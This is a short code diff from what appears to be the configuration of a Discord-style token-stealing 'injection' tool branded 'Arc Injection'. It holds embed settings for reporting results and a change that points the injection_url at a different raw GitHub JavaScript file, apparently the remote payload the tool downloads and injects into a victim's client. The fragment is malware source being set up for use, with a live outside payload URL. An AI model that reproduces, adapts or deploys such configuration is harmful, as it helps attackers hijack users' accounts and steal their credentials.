@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Arc Injection', 
   embed_icon: 'https://i.imgur.com/LxW0VEu.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/kozelkozel1237/ara/main/injection.js', 
   /**
    
    **/
